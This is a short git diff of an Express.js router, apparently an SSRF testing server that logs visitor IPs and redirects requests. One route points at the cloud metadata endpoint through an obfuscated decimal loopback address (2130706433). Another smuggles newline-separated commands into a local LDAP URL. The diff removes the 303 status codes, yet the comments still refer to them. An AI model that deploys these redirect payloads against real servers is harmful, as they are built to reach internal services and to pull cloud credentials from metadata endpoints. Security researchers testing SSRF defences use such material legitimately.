@@ -21,19 +21,19 @@ router.get('/payload', function(req, res) {
  router.get('/redir', function(req, res) {
    var ipInfo = JSON.stringify(getIP(req));
      mongodb.sendVal("Redirection: " + ipInfo, 0);
-    res.redirect(303, 'http://2130706433/latest/meta-data') // Notice the 303 parameter
+    res.redirect('http://2130706433/latest/meta-data') // Notice the 303 parameter
  });
 
  router.get('/redir2', function(req, res) {
    var ipInfo = JSON.stringify(getIP(req));
      mongodb.sendVal("Redirection: " + ipInfo, 0);
-    res.redirect(303, 'ldap://localhost:1337/%0astats%0aquit')
+    res.redirect('ldap://localhost:1337/%0astats%0aquit')
  });
 
  router.get('/redir3', function(req, res) {
    var ipInfo = JSON.stringify(getIP(req));
      mongodb.sendVal("Redirection: " + ipInfo, 0);
-    res.redirect(303, 'https://toiletbrush.cleverapps.io') // Notice the 303 parameter
+    res.redirect('https://toiletbrush.cleverapps.io') // Notice the 303 parameter
  });
 
 
